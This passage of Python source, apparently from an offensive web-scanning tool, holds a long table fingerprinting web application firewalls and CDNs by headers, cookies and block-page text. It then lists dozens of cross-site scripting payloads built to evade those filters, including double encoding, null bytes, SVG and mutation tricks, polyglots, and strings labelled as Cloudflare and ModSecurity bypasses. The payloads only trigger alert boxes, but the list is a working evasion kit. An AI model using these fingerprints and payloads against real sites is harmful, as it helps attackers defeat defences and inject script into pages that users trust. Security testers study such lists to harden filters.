            'body': ['cloudfloor dns', 'cloudfloor'],
        },
        'cloudfront': {
            'headers': ['x-amz-cf-id', 'x-amz-cf-pop', 'via: cloudfront'],
            'body': ['cloudfront', 'generated by cloudfront'],
        },
        'akamai': {
            'headers': ['x-akamai-transformed', 'akamai-grn', 'x-akamai-request-id', 'x-akamai-edgescape', 'x-akamai-session-info'],
            'server': ['akamai', 'akamaighost', 'akamaighostsvc'],
            'body': ['access denied', 'akamai reference', 'akamai technologies', 'akamai ghost', 'ak_bmsc'],
            'cookies': ['ak_bmsc', 'akavpau', 'akamai_g'],
        },
        'kona_sitedefender': {
            'headers': ['x-akamai-', 'akamai-'],
            'body': ['kona site defender', 'access denied', 'akamai'],
        },
        'aws_waf': {
            'headers': ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-id-2', 'x-amzn-trace-id', 'x-amz-apigw-id'],
            'body': ['aws waf', 'request blocked', 'automated request blocked', 'awswafbodyparser'],
            'cookies': ['awsalb', 'awsalbcors'],
        },
        'aws_elb': {
            'headers': ['x-amzn-requestid', 'x-amz-id-2'],
            'body': ['aws elastic load balancer', 'amazon'],
            'cookies': ['awselb', 'awselbcors'],
        },
        'google_cloud_armor': {
            'headers': ['x-cloud-trace-context', 'x-goog-', 'x-gfe-', 'via: 1.1 google'],
            'server': ['gws', 'gse', 'google frontend'],
            'body': ['google cloud armor', 'google cloud app armor', 'blocked by cloud armor', 'your client has issued a malformed or illegal request'],
        },
        'azure_waf': {
            'headers': ['x-azure-ref', 'x-ms-request-id', 'x-ms-routing-request-id', 'x-azure-requestchain', 'x-azure-fdid'],
            'body': ['azure application gateway', 'this website is protected by azure', 'azure front door', 'web application firewall transaction id'],
            'cookies': ['ardaffinity', 'azure-waf'],
        },
        'azure_frontdoor': {
            'headers': ['x-azure-fdid', 'x-fd-healthprobe'],
            'body': ['azure front door', 'microsoft azure'],
        },
        'oracle_cloud': {
            'headers': ['x-oracle-', 'opc-request-id'],
            'body': ['oracle cloud', 'oracle dyn'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # F5 NETWORKS
        # ═══════════════════════════════════════════════════════════════════
        'f5_bigip': {
            'headers': ['x-wa-info', 'x-cnection', 'x-f5-'],
            'server': ['bigip', 'big-ip', 'f5', 'f5-trafficshield'],
            'body': ['the requested url was rejected', 'f5 networks', 'f5 big-ip', 'please consult with your administrator', 'support id:'],
            'cookies': ['ts', 'bigipserver', 'bigipserverpool', 'f5_hz', 'f5_st'],
        },
        'f5_asm': {
            'headers': ['x-waf-event-info'],
            'body': ['f5 application security manager', 'the requested url was rejected by the bot defense solution', 'f5-asm', 'big-ip ap manager', 'big-ip appsec manager'],
        },
        'f5_ltm': {
            'headers': ['x-f5-'],
            'body': ['big-ip local traffic manager', 'f5 ltm'],
            'cookies': ['bigipserver'],
        },
        'firepass': {
            'body': ['firepass', 'f5 firepass'],
            'cookies': ['mrhsession', 'lastemresort'],
        },
        'trafficshield': {
            'server': ['f5-trafficshield'],
            'body': ['trafficshield', 'f5 trafficshield'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # FORTINET
        # ═══════════════════════════════════════════════════════════════════
        'fortigate': {
            'server': ['fortigate'],
            'body': ['fortigate', 'fortinet', 'by fortinet'],
            'cookies': ['fgd_icon'],
        },
        'fortiweb': {
            'server': ['fortiweb'],
            'headers': ['fortiwafsid'],
            'body': ['fortiweb', 'fortinet'],
            'cookies': ['fortiwafsid', 'fortiweb'],
        },
        'fortiguard': {
            'body': ['fortiguard', 'fortinet fortiguard'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # IMPERVA/INCAPSULA
        # ═══════════════════════════════════════════════════════════════════
        'imperva': {
            'headers': ['x-iinfo', 'x-cdn', 'x-sl-request-id'],
            'body': ['incapsula', 'imperva', 'powered by incapsula', 'incapsula incident id', 'request unsuccessful', '_incap_ses', 'visid_incap', 'securesphere'],
            'cookies': ['incap_ses', 'visid_incap', 'nlbi_', 'incap_ses_', 'visid_incap_'],
        },
        'securesphere': {
            'headers': ['x-iinfo'],
            'body': ['securesphere', 'imperva securesphere'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # CITRIX
        # ═══════════════════════════════════════════════════════════════════
        'netscaler': {
            'server': ['netscaler', 'citrix'],
            'headers': ['via: ns-cache', 'cneonction', 'x-citrix-'],
            'body': ['netscaler', 'citrix', 'citrix application delivery controller', 'netscaler appfirewall'],
            'cookies': ['ns_af', 'citrix_ns_id', 'nsc_'],
        },
        'teros': {
            'server': ['teros'],
            'body': ['teros', 'citrix teros'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # BARRACUDA
        # ═══════════════════════════════════════════════════════════════════
        'barracuda': {
            'server': ['barracuda'],
            'headers': ['barra_counter_session'],
            'body': ['barracuda networks', 'barracuda web application firewall', 'the request was blocked', 'barracuda waf'],
            'cookies': ['barra_counter_session', 'barra_'],
        },
        'netcontinuum': {
            'server': ['netcontinuum'],
            'body': ['netcontinuum', 'barracuda networks'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # RADWARE
        # ═══════════════════════════════════════════════════════════════════
        'radware': {
            'headers': ['x-bot-score', 'x-rdwr-', 'x-appwall-', 'x-app-sec-'],
            'body': ['radware', 'appwall', 'radware bot manager', 'challenge page'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # PALO ALTO NETWORKS
        # ═══════════════════════════════════════════════════════════════════
        'palo_alto': {
            'server': ['palo alto', 'paloalto'],
            'headers': ['x-pan-'],
            'body': ['palo alto networks', 'by palo alto', 'pan-os', 'threat prevention', 'palo alto next gen firewall'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # CHINESE WAFs
        # ═══════════════════════════════════════════════════════════════════
        'alibaba_waf': {
            'headers': ['eagleid', 'x-alibaba-', 'x-server-response-time'],
            'server': ['aliyun', 'aserver', 'aliyundun'],
            'body': ['blocked by ali-waf', 'aliyun', 'alibaba cloud', 'antibot protect', 'aliyundun'],
            'cookies': ['aliyun', 'acw_tc', 'acw_sc'],
        },
        'tencent_waf': {
            'headers': ['x-tcdn-', 'x-nws-', 'tencent-'],
            'body': ['tencent cloud', 'tencent waf', 'cdn.dnspod.cn', 'tencent cloud firewall', 'qcloud'],
        },
        'qcloud': {
            'headers': ['x-tcdn-'],
            'body': ['qcloud', 'tencent cloud'],
        },
        'baidu_waf': {
            'headers': ['x-yunjiasu-'],
            'server': ['yunjiasu'],
            'body': ['baidu cloud', 'yunjiasu', 'intercepted by anti-leech'],
        },
        'nsfocus': {
            'headers': ['nsfocus'],
            'server': ['nsfocus'],
            'body': ['nsfocus', 'nsfocus global'],
        },
        'knownsec': {
            'headers': ['x-safe-firewall'],
            'body': ['knownsec', 'ks-waf', 'jiasule'],
        },
        'jiasule': {
            'headers': ['x-jiasule-'],
            'body': ['jiasule', 'knownsec'],
            'cookies': ['__jsluid'],
        },
        'yundun': {
            'headers': ['yundun-'],
            'server': ['yundun'],
            'body': ['yundun', 'blocked by yundun'],
            'cookies': ['yundun'],
        },
        'anquanbao': {
            'headers': ['x-anquanbao-'],
            'body': ['anquanbao', 'aqb_'],
        },
        'anyu': {
            'body': ['anyu technologies', 'anyu'],
        },
        'safedog': {
            'server': ['safedog'],
            'body': ['safedog', 'safe dog'],
            'cookies': ['safedog'],
        },
        'safeline': {
            'body': ['safeline', 'chaitin tech'],
        },
        'chuangyushield': {
            'body': ['chuang yu shield', 'yunaq'],
        },
        'huawei_waf': {
            'headers': ['x-hwwaf-'],
            'body': ['huawei cloud firewall', 'huawei cloud'],
        },
        'bluedon': {
            'body': ['bluedon', 'bluedon ist'],
        },
        'west263': {
            'body': ['west263 cdn', 'west263cdn'],
        },
        'chinacache': {
            'headers': ['x-cc-'],
            'body': ['chinacache', 'chinacache load balancer'],
        },
        'cdnns': {
            'headers': ['x-cdnns-'],
            'body': ['cdnns application gateway', 'wdidcnet'],
        },
        'puhui': {
            'body': ['puhui', 'puhui waf'],
        },
        'qiniu': {
            'headers': ['x-qiniu-'],
            'body': ['qiniu', 'qiniu cdn'],
        },
        'eisoo': {
            'body': ['eisoo cloud firewall', 'eisoo'],
        },
        'xuanwudun': {
            'body': ['xuanwudun', 'xuanwu'],
        },
        'yunsuo': {
            'body': ['yunsuo', 'yunsuo waf'],
            'cookies': ['yunsuo_session'],
        },
        'senginx': {
            'server': ['senginx'],
            'body': ['senginx', 'neusoft'],
        },
        'powercdn': {
            'body': ['powercdn', 'power cdn'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # SECURITY VENDORS
        # ═══════════════════════════════════════════════════════════════════
        'sucuri': {
            'headers': ['x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block', 'x-sucuri-protected'],
            'server': ['sucuri', 'sucuri/cloudproxy'],
            'body': ['sucuri website firewall', 'sucuri cloudproxy', 'access denied - sucuri', 'sucuri website security'],
            'cookies': ['sucuri_cloudproxy_uuid_', 'sucuri-'],
        },
        'stackpath': {
            'headers': ['x-sp-', 'x-stackpath-', 'sp-server-id'],
            'server': ['stackpath', 'securecdn'],
            'body': ['stackpath', 'highwinds', 'protected by stackpath', 'securecdn'],
        },
        'edgecast': {
            'headers': ['x-ec-', 'x-edgecast-'],
            'server': ['ecs', 'edgecast'],
            'body': ['edgecast', 'verizon digital media', 'your request has been blocked'],
        },
        'fastly': {
            'headers': ['x-fastly-', 'fastly-', 'x-served-by', 'x-cache-hits'],
            'server': ['fastly'],
            'body': ['fastly error', 'request blocked by fastly', 'varnish cache server'],
        },
        'keycdn': {
            'headers': ['x-keycdn-', 'keycdn-'],
            'server': ['keycdn'],
            'body': ['keycdn', 'protected by keycdn'],
        },
        'limelight': {
            'headers': ['x-llnw-', 'x-limelight-'],
            'server': ['limelight'],
            'body': ['limelight networks', 'llnw', 'limelight cdn'],
        },
        'maxcdn': {
            'headers': ['x-maxcdn-', 'x-push', 'x-pull'],
            'server': ['netdna', 'maxcdn'],
            'body': ['maxcdn', 'netdna'],
        },
        'beluga': {
            'headers': ['x-beluga-'],
            'body': ['beluga cdn', 'beluga'],
        },
        'cachefly': {
            'headers': ['x-cachefly-'],
            'body': ['cachefly cdn', 'cachefly'],
        },
        'airee': {
            'headers': ['x-airee-'],
            'body': ['aireecdn', 'airee'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # BOT PROTECTION & ANTI-DDOS
        # ═══════════════════════════════════════════════════════════════════
        'reblaze': {
            'headers': ['x-reblaze-', 'rbzid'],
            'body': ['reblaze', 'protected by reblaze', 'access denied by reblaze'],
            'cookies': ['rbzid', 'rbzsessionid'],
        },
        'datadome': {
            'headers': ['x-datadome', 'x-dd-'],
            'body': ['datadome', 'blocked by datadome', 'datacaptcha'],
            'cookies': ['datadome', 'dd_'],
        },
        'perimeterx': {
            'headers': ['x-px-', 'x-px-enforcer-true-ip'],
            'body': ['perimeterx', 'human challenge', '_pxvid', 'px-captcha'],
            'cookies': ['_px', '_pxvid', '_pxhd', 'pxcts'],
        },
        'distil': {
            'headers': ['x-distil-'],
            'body': ['distil networks', 'blocked by distil', 'distilnetworkscaptcha'],
            'cookies': ['distil_identifier', 'd_id'],
        },
        'kasada': {
            'headers': ['x-kpsdk', 'x-kas-'],
            'body': ['kasada', 'polymorph'],
            'cookies': ['kppid', 'kpsdkid'],
        },
        'ddos_guard': {
            'headers': ['x-ddos-guard'],
            'body': ['ddos-guard', 'ddos guard'],
        },
        'dosarrest': {
            'headers': ['x-dosarrest-'],
            'body': ['dosarrest', 'dosarrest internet security'],
        },
        'nullddos': {
            'body': ['nullddos protection', 'nullddos'],
        },
        'blockdos': {
            'body': ['blockdos', 'block dos'],
        },
        'qrator': {
            'headers': ['x-qrator-'],
            'body': ['qrator', 'qrator labs'],
        },
        'variti': {
            'body': ['variti', 'active bot protection'],
        },
        'threatx': {
            'body': ['threatx', 'a10 networks'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # ENTERPRISE/NETWORK WAFs
        # ═══════════════════════════════════════════════════════════════════
        'checkpoint': {
            'server': ['checkpoint'],
            'headers': ['x-chkp-'],
            'body': ['check point', 'checkpoint', 'user check', 'application control'],
        },
        'juniper': {
            'server': ['juniper', 'junos'],
            'body': ['juniper networks', 'srx series', 'web filtering'],
        },
        'sonicwall': {
            'server': ['sonicwall', 'sonicos'],
            'body': ['sonicwall', 'web site blocked', 'content filter blocked', 'dell sonicwall'],
        },
        'watchguard': {
            'server': ['watchguard'],
            'body': ['watchguard', 'fireware', 'blocked by watchguard', 'watchguard technologies'],
        },
        'datapower': {
            'headers': ['x-dp-'],
            'body': ['datapower', 'ibm datapower'],
        },
        'webseal': {
            'server': ['webseal'],
            'body': ['webseal', 'ibm webseal'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # MODSECURITY & OPEN SOURCE
        # ═══════════════════════════════════════════════════════════════════
        'modsecurity': {
            'server': ['mod_security', 'modsecurity', 'modsec'],
            'headers': ['x-mod-security-message', 'modsecurity', 'x-modsecurity-'],
            'body': ['mod_security', 'modsecurity', 'this error was generated by mod_security', 'owasp modsecurity core rule set'],
        },
        'naxsi': {
            'headers': ['x-naxsi-'],
            'body': ['naxsi', 'nbs systems'],
        },
        'shadow_daemon': {
            'body': ['shadow daemon', 'zecure'],
        },
        'openresty': {
            'server': ['openresty'],
            'body': ['open-resty', 'openresty lua nginx'],
        },
        'varnish': {
            'headers': ['x-varnish-'],
            'server': ['varnish'],
            'body': ['varnish', 'cachewall', 'owasp varnish'],
        },
        'envoy': {
            'server': ['envoy'],
            'body': ['envoyproxy', 'envoy'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # WORDPRESS/CMS WAFs
        # ═══════════════════════════════════════════════════════════════════
        'wordfence': {
            'body': ['wordfence', 'generated by wordfence', 'your access to this site has been limited', 'wordfence waf', 'defiant'],
            'cookies': ['wfwaf-authcookie', 'wf_loginalerted_'],
        },
        'bulletproof_security': {
            'body': ['bulletproof security', 'bps security', 'login security solution', 'aitpro security'],
        },
        'secupress': {
            'body': ['secupress', 'blocked by secupress'],
        },
        'ninjaFirewall': {
            'body': ['ninjafirewall', 'ninja firewall', 'blocked by ninja firewall', 'nintechnet'],
        },
        'cerber_security': {
            'body': ['wp cerber security', 'cerber tech'],
        },
        'shield_security': {
            'body': ['shield security', 'one dollar plugin'],
        },
        'malcare': {
            'body': ['malcare', 'inactiv'],
        },
        'webarx': {
            'body': ['webarx', 'webarx security solutions'],
        },
        'wpmudev': {
            'body': ['wpmudev waf', 'incsub'],
        },
        'rsfirewall': {
            'body': ['rsfirewall', 'rsjoomla'],
        },
        'crawlprotect': {
            'body': ['crawlprotect', 'jean-denis brun'],
        },
        'expression_engine': {
            'body': ['expression engine', 'ellislab'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # HOSTING/PLATFORM WAFs
        # ═══════════════════════════════════════════════════════════════════
        'siteground': {
            'body': ['siteground', 'sg security'],
        },
        'godaddy': {
            'body': ['godaddy website protection', 'godaddy'],
        },
        'squarespace': {
            'headers': ['x-squarespace-'],
            'server': ['squarespace'],
            'body': ['squarespace', 'blocked by squarespace'],
        },
        'wix_waf': {
            'headers': ['x-wix-'],
            'body': ['blocked by wix', 'wix.com'],
        },
        'litespeed': {
            'server': ['litespeed'],
            'headers': ['x-litespeed-', 'ls_'],
            'body': ['litespeed', 'litespeed technologies', 'powered by litespeed', 'ls_'],
            'cookies': ['ls_smartpush'],
        },
        'imunify360': {
            'body': ['imunify360', 'cloudlinux'],
        },
        'bitninja': {
            'body': ['bitninja', 'bit ninja'],
        },
        'virusdie': {
            'body': ['virusdie', 'virusdie llc'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # MIDDLE EAST/IRAN
        # ═══════════════════════════════════════════════════════════════════
        'arvancloud': {
            'headers': ['x-arvan-', 'ar-real-ip'],
            'body': ['arvancloud', 'arvan cloud'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # OTHER SECURITY SOLUTIONS
        # ═══════════════════════════════════════════════════════════════════
        'comodo': {
            'server': ['comodo', 'cwatch'],
            'body': ['protected by comodo', 'comodo waf', 'cwatch', 'comodo cybersecurity'],
        },
        'wallarm': {
            'headers': ['x-wallarm-instance', 'x-attack-free', 'x-wallarm-'],
            'body': ['wallarm', 'protected by wallarm', 'wallarm inc'],
        },
        'armor': {
            'headers': ['x-armor-protection', 'x-armor-'],
            'body': ['armor defense', 'blocked by armor', 'armor security'],
        },
        'denyall': {
            'headers': ['x-denyall-', 'sessioncookie'],
            'body': ['denyall', 'conditioned access', 'rohde & schwarz cybersecurity'],
        },
        'airlock': {
            'headers': ['al-sess', 'al-lb'],
            'body': ['airlock', 'ergon informatik', 'phion'],
            'cookies': ['al_sess', 'al_lb'],
        },
        'profense': {
            'headers': ['x-profense-'],
            'server': ['profense'],
            'body': ['profense', 'armorlogic'],
        },
        'sitelock': {
            'headers': ['x-sitelock'],
            'body': ['sitelock', 'protected by sitelock', 'sitelock trueshield'],
        },
        'zenedge': {
            'headers': ['x-zen-', 'zenedge'],
            'body': ['zenedge', 'oracle dyn'],
            'cookies': ['zenedge'],
        },
        'alert_logic': {
            'body': ['alert logic', 'alertlogic'],
        },
        'approach': {
            'body': ['approach', 'approach security'],
        },
        'astra': {
            'body': ['astra', 'czar securities'],
        },
        'barikode': {
            'body': ['barikode', 'ethic ninja'],
        },
        'baffin_bay': {
            'body': ['baffin bay', 'mastercard'],
        },
        'bekchy': {
            'body': ['bekchy', 'faydata technologies'],
        },
        'binarysec': {
            'body': ['binarysec', 'binary sec'],
        },
        'cloud_protector': {
            'body': ['cloud protector', 'rohde & schwarz'],
        },
        'cloudbric': {
            'body': ['cloudbric', 'penta security'],
        },
        'dotdefender': {
            'body': ['dotdefender', 'applicure technologies'],
        },
        'dynamicweb': {
            'body': ['dynamicweb injection check', 'dynamicweb'],
        },
        'greywizard': {
            'body': ['greywizard', 'grey wizard'],
        },
        'hyperguard': {
            'body': ['hyperguard', 'art of defense'],
        },
        'indusguard': {
            'body': ['indusguard', 'indusface'],
        },
        'instart': {
            'body': ['instart dx', 'instart logic'],
        },
        'janusec': {
            'body': ['janusec application gateway', 'janusec'],
        },
        'kemp': {
            'body': ['kemp loadmaster', 'progress software'],
        },
        'link11': {
            'body': ['link11 waap', 'link11'],
        },
        'mission_control': {
            'body': ['mission control shield', 'mission control'],
        },
        'nemesida': {
            'body': ['nemesida', 'pentestit'],
        },
        'nevisproxy': {
            'body': ['nevisproxy', 'adnovum'],
        },
        'newdefend': {
            'body': ['newdefend', 'new defend'],
        },
        'nexusguard': {
            'body': ['nexusguard firewall', 'nexusguard'],
        },
        'onmessage_shield': {
            'body': ['onmessage shield', 'blackbaud'],
        },
        'pt_appfirewall': {
            'body': ['pt application firewall', 'positive technologies'],
        },
        'pentawaf': {
            'body': ['pentawaf', 'global network services'],
        },
        'raywaf': {
            'body': ['raywaf', 'webray solutions'],
        },
        'sabre': {
            'body': ['sabre firewall', 'sabre'],
        },
        'safe3': {
            'body': ['safe3 web firewall', 'safe3'],
        },
        'secking': {
            'body': ['secking', 'sec king'],
        },
        'secure_entry': {
            'body': ['secure entry', 'united security providers'],
        },
        'serverdefender': {
            'body': ['serverdefender vp', 'port80 software'],
        },
        'siteguard': {
            'body': ['siteguard', 'eg secure solutions'],
        },
        'squidproxy': {
            'body': ['squidproxy ids', 'squidproxy'],
        },
        'transip': {
            'body': ['transip web firewall', 'transip'],
        },
        'uewaf': {
            'body': ['uewaf', 'ucloud'],
        },
        'urlmaster': {
            'body': ['urlmaster securitycheck', 'dotnetnuke'],
        },
        'urlscan': {
            'body': ['urlscan', 'microsoft urlscan'],
        },
        'utm': {
            'body': ['utm web protection', 'sophos'],
        },
        'webknight': {
            'body': ['webknight', 'aqtronix'],
        },
        'webland': {
            'body': ['webland', 'web land'],
        },
        'webtotem': {
            'body': ['webtotem', 'web totem'],
        },
        'xlabs': {
            'body': ['xlabs security waf', 'xlabs'],
        },
        'yxlink': {
            'body': ['yxlink', 'yxlink technologies'],
        },
        'zscaler': {
            'headers': ['x-zscaler-'],
            'body': ['zscaler', 'accenture'],
        },
        'aesecure': {
            'body': ['aesecure', 'ae secure'],
        },
        'eeye': {
            'body': ['eeye secureiis', 'beyondtrust'],
        },
        'pksecurity': {
            'body': ['pksecurity ids', 'pksec'],
        },
        'shieldon': {
            'body': ['shieldon firewall', 'shieldon.io'],
        },
        'azion': {
            'body': ['azion edge firewall', 'azion'],
        },
        'isa_server': {
            'body': ['isa server', 'microsoft isa'],
        },
        'request_validation': {
            'body': ['request validation mode', 'asp.net'],
        },
        'wts_waf': {
            'body': ['wts-waf', 'wts waf'],
        },
        'viettel': {
            'body': ['viettel', 'cloudrity'],
        },
        'aspa': {
            'body': ['aspa firewall', 'aspa engineering'],
        },
        'ace_xml': {
            'body': ['ace xml gateway', 'cisco'],
        },
        'asp_net': {
            'headers': ['x-aspnet-version'],
            'body': ['asp.net generic', 'microsoft asp'],
        },
        
        # ═══════════════════════════════════════════════════════════════════
        # GENERIC/FALLBACK DETECTION
        # ═══════════════════════════════════════════════════════════════════
        'generic_waf': {
            'body': [
                'access denied', 'request blocked', 'forbidden', 'not acceptable',
                'security violation', 'request rejected', 'illegal request',
                'the page you are looking for is temporarily unavailable',
                'web application firewall', 'waf', 'attack detected',
                'malicious request', 'suspicious activity', 'blocked by security',
                'automated request blocked', 'bot detected', 'your ip has been blocked',
                'security check', 'ddos protection', 'rate limit exceeded',
                'too many requests', 'please verify you are human',
                'challenge required', 'captcha required', 'your request appears to be automated',
                'security policy violation', 'blocked for security reasons',
            ],
        },
    }
    
    # Advanced WAF Bypass Payloads
    WAF_BYPASS_PAYLOADS = [
        # =================================================================
        # ENCODING BYPASSES (Double/Triple URL encoding)
        # =================================================================
        '%253Cscript%253Ealert(1)%253C%252Fscript%253E',  # Double URL encoded
        '%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E',  # Triple URL encoded
        '%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E',  # Full hex encode
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',  # Unicode escape
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',  # Hex escape
        
        # =================================================================
        # NULL BYTE & CONTROL CHARACTER INJECTION
        # =================================================================
        '<scr%00ipt>alert(1)</scr%00ipt>',
        '<scr\\x00ipt>alert(1)</scr\\x00ipt>',
        '<script/x>alert(1)</script>',
        '<script\\x20>alert(1)</script>',
        '<script\\x0d\\x0a>alert(1)</script>',
        '<script\\x09>alert(1)</script>',
        '<svg/\\x00onload=alert(1)>',
        '<img\\x00src=x\\x00onerror=alert(1)>',
        
        # =================================================================
        # CASE MIXING & PADDING
        # =================================================================
        '<ScRiPt>alert(1)</sCrIpT>',
        '<sCRiPt>alert(1)</ScRiPt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<script   >alert(1)</script   >',
        '<script\t\t>alert(1)</script>',
        '<script\n>alert(1)</script\n>',
        
        # =================================================================
        # TAG & ATTRIBUTE OBFUSCATION
        # =================================================================
        '<<script>script>alert(1)</script>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<script/abc>alert(1)</script>',
        '<script abc="">alert(1)</script>',
        '<script/x=""x="">alert(1)</script>',
        '<script ~~~>alert(1)</script>',
        '<script!>alert(1)</script>',
        '<script\\>alert(1)</script>',
        
        # =================================================================
        # JAVASCRIPT KEYWORD OBFUSCATION
        # =================================================================
        '<script>alert`1`</script>',
        '<script>alert&lpar;1&rpar;</script>',
        '<script>\\u0061lert(1)</script>',
        '<script>\\x61lert(1)</script>',
        '<script>al\\u0065rt(1)</script>',
        '<script>window["alert"](1)</script>',
        '<script>window["al"+"ert"](1)</script>',
        '<script>self["alert"](1)</script>',
        '<script>this["alert"](1)</script>',
        '<script>top["alert"](1)</script>',
        '<script>parent["alert"](1)</script>',
        '<script>frames["alert"](1)</script>',
        '<script>eval("ale"+"rt(1)")</script>',
        '<script>Function("alert(1)")()</script>',
        '<script>new Function`alert(1)`()</script>',
        '<script>[].constructor.constructor("alert(1)")()</script>',
        '<script>Reflect.apply(alert,null,[1])</script>',
        
        # =================================================================
        # EVENT HANDLER BYPASSES  
        # =================================================================
        '<img src=x onerror=alert`1`>',
        '<img src=x onerror="alert(1)">',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>',
        '<svg/onload=alert(1)>',
        '<svg onload=alert(1)//',
        '<svg/onload=alert`1`>',
        '<svg onload=alert&lpar;1&rpar;>',
        '<svg onload="javascript:alert(1)">',
        '<svg/onload=window.alert(1)>',
        '<body/onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<input/onfocus=alert(1)/autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<meter onmouseover=alert(1)>0</meter>',
        '<object data=javascript:alert(1)>',
        
        # =================================================================
        # SVG ADVANCED BYPASSES
        # =================================================================
        '<svg><script>alert(1)</script></svg>',
        '<svg><script xlink:href=data:,alert(1)></script></svg>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><set onbegin=alert(1) attributename=x>',
        '<svg><handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(1)</handler>',
        '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',
        '<svg><use xlink:href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">',
        '<svg><a xlink:href="javascript:alert(1)"><rect width=100 height=100 /></a></svg>',
        '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>',
        
        # =================================================================
        # HTML5 ADVANCED BYPASSES
        # =================================================================
        '<math><maction xlink:href="javascript:alert(1)">click</maction></math>',
        '<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>',
        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
        '<form action="javascript:alert(1)"><input type=submit>',
        '<form><button formaction=javascript:alert(1)>X</button>',
        '<isindex action="javascript:alert(1)">',
        '<base href="javascript:/a/-alert(1)///////">',
        '<embed src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        
        # =================================================================
        # DATA URI BYPASSES
        # =================================================================
        '<a href="data:text/html,<script>alert(1)</script>">click</a>',
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        '<embed src="data:image/svg+xml,<svg onload=alert(1)>">',
        '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',
        
        # =================================================================
        # MUTATION XSS (mXSS) BYPASSES
        # =================================================================
        '<noscript><p title="</noscript><script>alert(1)</script>">',
        '<p style="animation-name:x" onanimationstart="alert(1)">',
        '<style>@keyframes x{}</style><p style="animation-name:x" onanimationend="alert(1)">',
        '<xmp><p title="</xmp><script>alert(1)</script>">',
        '<title><img src=x onerror=alert(1)>',
        '<listing><img onerror=alert(1) src=x>',
        '<plaintext><script>alert(1)</script>',
        '<noembed><img src=x onerror=alert(1)>',
        '<template><script>alert(1)</script></template>',
        
        # =================================================================
        # COMMENT & CDATA BYPASSES
        # =================================================================
        '<!--><script>alert(1)</script>-->',
        '<!--><svg onload=alert(1)>-->',
        '<![CDATA[><script>alert(1)</script>]]>',
        '--!><svg onload=alert(1)>',
        '<!--/--!><script>alert(1)</script>',
        '</style></script><script>alert(1)</script>',
        '</title><script>alert(1)</script>',
        
        # =================================================================
        # POLYGLOT MULTI-CONTEXT BYPASSES  
        # =================================================================
        'javascript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>//\\x3e',
        '"-alert(1)-"',
        "'-alert(1)-'",
        '\\";alert(1);//',
        "\\\';alert(1);//",
        '</script><svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>//',
        "'><img src=x onerror=alert(1)>//",
        '"><svg onload=alert(1)>//',
        "javascript:alert(1)//",
        
        # =================================================================
        # SPECIFIC WAF BYPASSES (Cloudflare, ModSecurity, etc.)
        # =================================================================
        # Cloudflare bypasses
        '<svg onload=prompt(1)>',
        '<svg onload=confirm(1)>',
        '<svg/onload=self[`ale`+`rt`](1)>',
        '<svg/onload=top[`al`+`ert`](1)>',
        '<img src=x onerror=self["al"+"ert"](1)>',
        '<img src=x onerror="this[`al`+`ert`](1)">',
        '<img src=x onerror="window[`a]ert`](1)">',
        '<svg/onload=eval(atob`YWxlcnQoMSk=`)>',
        '<svg onload=setTimeout`alert\x281\x29`>',
        
        # ModSecurity bypasses
        '<a href="javas\tcript:alert(1)">click</a>',
        '<a href="java\nscript:alert(1)">click</a>',
        '<a href="j\\u0061vascript:alert(1)">click</a>',
        '<script>onerror=alert;throw 1</script>',
        '<script>{onerror=alert}throw 1</script>',
        '<script>throw onerror=alert,1</script>',
        '<svg onload="[1].find(alert)">',
        '<svg onload="[1].map(alert)">',
        
